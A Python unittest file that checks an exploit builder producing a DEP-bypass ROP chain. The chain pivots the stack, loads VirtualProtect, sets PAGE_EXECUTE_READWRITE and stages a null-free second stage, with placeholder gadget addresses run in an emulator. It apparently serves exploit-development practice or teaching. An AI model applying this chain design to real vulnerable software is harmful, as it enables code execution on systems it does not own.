from __future__ import annotations

import unittest
from struct import pack

from dep3_layout import DEREF_OFFSET, Dep3Gadgets, build_dep3_payload
from verify_dep3_chain import (
    ChainError,
    Dep3ChainVerifier,
    verify_pushad_frame,
)


GADGET_ADDRS = Dep3Gadgets(
    pop_eax=0x62502030,
    pivot=0x62502031,
    pop_ecx_ebp_edi_eax=0x62502032,
    xchg_eax_edx=0x62502033,
    pop_ebx_ebp_eax=0x62502034,
    pop_ebp=0x62502035,
    dereference_eax_plus_10=0x62502036,
    xchg_eax_esi=0x62502037,
    add_esp_0x1c=0x62502038,
    pushad=0x62502039,
    ret=0x62502141,
    neg_eax=0x62502142,
    mov_esi_eax=0x62502143,
    xchg_eax_ebx=0x62502144,
)

GADGET_MAP = {
    0x62502030: "pop_eax;ret",
    0x62502032: "pop_ecx;pop_ebp;pop_edi;pop_eax;ret",
    0x62502033: "xchg_eax_edx;ret",
    0x62502034: "pop_ebx;pop_ebp;pop_eax;ret",
    0x62502035: "pop_ebp;ret",
    0x62502036: "deref_eax_plus_10;ret",
    0x62502037: "xchg_eax_esi;ret",
    0x62502038: "add_esp_0x1c;ret",
    0x62502039: "pushad",
    0x62502141: "ret",
    0x62502142: "neg_eax;ret",
    0x62502143: "mov_[esi]_eax;ret",
    0x62502144: "xchg_eax_ebx;ret",
}

CACHED_VP_PTR = 0x62505151
VIRTUALPROTECT = 0x76AB1234
STAGE2_ADDR = 0x62504141
REGION_SIZE = 0x201


class Dep3ChainExecutionTests(unittest.TestCase):
    def _build_and_extract_stage2(self) -> bytes:
        proof = b"\xCC\xCC\xCC\xCC"
        payload = build_dep3_payload(
            saved_eip_offset=8,
            stage2_address=STAGE2_ADDR,
            stage2_offset=32,
            cached_virtualprotect=CACHED_VP_PTR,
            proof=proof,
            gadgets=GADGET_ADDRS,
            region_size=REGION_SIZE,
        )
        stage2_with_proof = payload[32:]
        return stage2_with_proof[: stage2_with_proof.index(b"\xCC\xCC\xCC\xCC")]

    def _make_verifier(self) -> Dep3ChainVerifier:
        return Dep3ChainVerifier(
            gadget_map=GADGET_MAP,
            memory={CACHED_VP_PTR: VIRTUALPROTECT},
        )

    def test_chain_produces_correct_pushad_frame(self) -> None:
        stage2 = self._build_and_extract_stage2()
        verifier = self._make_verifier()
        regs = verifier.execute(stage2)

        proof_address = STAGE2_ADDR + len(stage2)
        errors = verify_pushad_frame(
            regs,
            expected_esi=VIRTUALPROTECT,
            expected_ebp=proof_address,
            expected_ebx=REGION_SIZE,
            expected_edx=0x40,
            expected_ecx=proof_address + len(b"\xCC\xCC\xCC\xCC"),
            ret_gadget=GADGET_ADDRS.ret,
        )
        self.assertEqual(errors, [], f"PUSHAD frame errors: {errors}")

    def test_edx_is_page_execute_readwrite(self) -> None:
        stage2 = self._build_and_extract_stage2()
        regs = self._make_verifier().execute(stage2)

        self.assertEqual(regs.edx, 0x40)

    def test_esi_holds_virtualprotect(self) -> None:
        stage2 = self._build_and_extract_stage2()
        regs = self._make_verifier().execute(stage2)

        self.assertEqual(regs.esi, VIRTUALPROTECT)

    def test_edi_is_ret_sled(self) -> None:
        stage2 = self._build_and_extract_stage2()
        regs = self._make_verifier().execute(stage2)

        self.assertEqual(regs.edi, GADGET_ADDRS.ret)

    def test_ebp_points_to_proof(self) -> None:
        stage2 = self._build_and_extract_stage2()
        regs = self._make_verifier().execute(stage2)

        self.assertEqual(regs.ebp, STAGE2_ADDR + len(stage2))

    def test_ecx_is_old_protect_writable(self) -> None:
        stage2 = self._build_and_extract_stage2()
        regs = self._make_verifier().execute(stage2)

        self.assertEqual(regs.ecx, STAGE2_ADDR + len(stage2) + len(b"\xCC\xCC\xCC\xCC"))

    def test_ebx_is_region_size(self) -> None:
        stage2 = self._build_and_extract_stage2()
        regs = self._make_verifier().execute(stage2)

        self.assertEqual(regs.ebx, REGION_SIZE)

    def test_payload_contains_no_null_bytes(self) -> None:
        proof = b"\xCC\xCC\xCC\xCC"
        payload = build_dep3_payload(
            saved_eip_offset=8,
            stage2_address=STAGE2_ADDR,
            stage2_offset=32,
            cached_virtualprotect=CACHED_VP_PTR,
            proof=proof,
            gadgets=GADGET_ADDRS,
            region_size=REGION_SIZE,
        )
        self.assertNotIn(b"\x00", payload)

    def test_aligned_cache_slot_is_allowed_when_adjusted_pointer_is_null_free(self) -> None:
        payload = build_dep3_payload(
            saved_eip_offset=8,
            stage2_address=STAGE2_ADDR,
            stage2_offset=32,
            cached_virtualprotect=0x62505000,
            proof=b"\xCC\xCC\xCC\xCC",
            gadgets=GADGET_ADDRS,
            region_size=REGION_SIZE,
        )

        self.assertIn(pack("<I", 0x62504FF0), payload)

    def test_old_protect_points_to_reserved_staged_scratch(self) -> None:
        proof = b"\xCC\xCC\xCC\xCC"
        payload = build_dep3_payload(
            saved_eip_offset=8,
            stage2_address=STAGE2_ADDR,
            stage2_offset=32,
            cached_virtualprotect=CACHED_VP_PTR,
            proof=proof,
            gadgets=GADGET_ADDRS,
            region_size=REGION_SIZE,
        )
        stage = payload[32:]
        stage2_length = stage.index(proof)
        regs = self._make_verifier().execute(stage[:stage2_length])

        self.assertEqual(regs.ecx, STAGE2_ADDR + stage2_length + len(proof))

    def test_unknown_gadget_raises_chain_error(self) -> None:
        bogus = pack("<I", 0xDEADBEEF)
        verifier = self._make_verifier()

        with self.assertRaises(ChainError):
            verifier.execute(bogus)

    def test_unmapped_dereference_raises_chain_error(self) -> None:
        stage2 = pack("<II", GADGET_ADDRS.pop_eax, 0x11111111)
        stage2 += pack("<I", GADGET_ADDRS.dereference_eax_plus_10)
        verifier = Dep3ChainVerifier(gadget_map=GADGET_MAP, memory={})

        with self.assertRaisesRegex(ChainError, "unmapped"):
            verifier.execute(stage2)


if __name__ == "__main__":
    unittest.main()
